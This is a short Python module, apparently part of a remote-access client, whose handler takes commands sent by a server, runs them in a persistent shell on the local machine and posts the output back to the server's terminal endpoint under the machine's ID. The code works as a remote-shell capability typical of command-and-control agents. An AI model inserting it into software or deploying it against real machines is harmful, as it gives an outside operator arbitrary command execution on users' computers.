from features.curlmanager import CurlManager
from features.shell import PersistentShell

persistent_shell = PersistentShell()

def handle_terminal_command(cfc_instance, data):
    try:
        curl = CurlManager()
        curl.set_headers(cfc_instance.headers)
        url=f"{cfc_instance.base_url}/terminal?pc_id={cfc_instance.client_data['pc_id']}"
        command = data.get("command")
        if command.upper() == "CLOSE":
            output = persistent_shell.close_shell()
            curl.post(url=url,json={'data': output})
        else:
            # Start shell if not already started
            if not persistent_shell.initialized:
                persistent_shell.start_shell()
            
            # Execute the command
            output = persistent_shell.execute_command(command)
            
            # Send the response back to the server
            curl.post(url,json={'data': output})
    except Exception as e:
        error_msg = f"Error executing command: {str(e)}"
        curl.post(url=f"{cfc_instance.base_url}/terminal?pc_id={cfc_instance.client_data['pc_id']}",json={'data': error_msg})